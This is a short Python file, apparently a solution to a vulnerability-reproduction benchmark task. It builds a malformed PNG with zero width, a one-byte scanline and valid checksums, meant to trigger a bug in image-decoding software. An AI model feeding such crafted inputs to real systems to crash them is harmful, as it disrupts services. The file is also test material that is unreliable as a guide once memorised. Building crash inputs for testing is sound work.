import struct
import binascii
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def crc(chunk_type: bytes, data: bytes) -> int:
            return binascii.crc32(chunk_type + data) & 0xffffffff

        def chunk(chunk_type: bytes, data: bytes) -> bytes:
            return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", crc(chunk_type, data))

        # PNG signature
        png_sig = b"\x89PNG\r\n\x1a\n"

        # IHDR with zero width and non-zero height
        width = 0
        height = 1
        bit_depth = 8
        color_type = 6  # RGBA
        compression = 0
        filter_method = 0
        interlace = 0

        ihdr_data = struct.pack(">IIBBBBB",
                                width,
                                height,
                                bit_depth,
                                color_type,
                                compression,
                                filter_method,
                                interlace)
        ihdr = chunk(b'IHDR', ihdr_data)

        # IDAT: for height=1 and width=0, rowbytes=0, need exactly 1 filter byte
        raw_scanlines = b'\x00' * height
        idat_data = zlib.compress(raw_scanlines)
        idat = chunk(b'IDAT', idat_data)

        iend = chunk(b'IEND', b'')

        return png_sig + ihdr + idat + iend
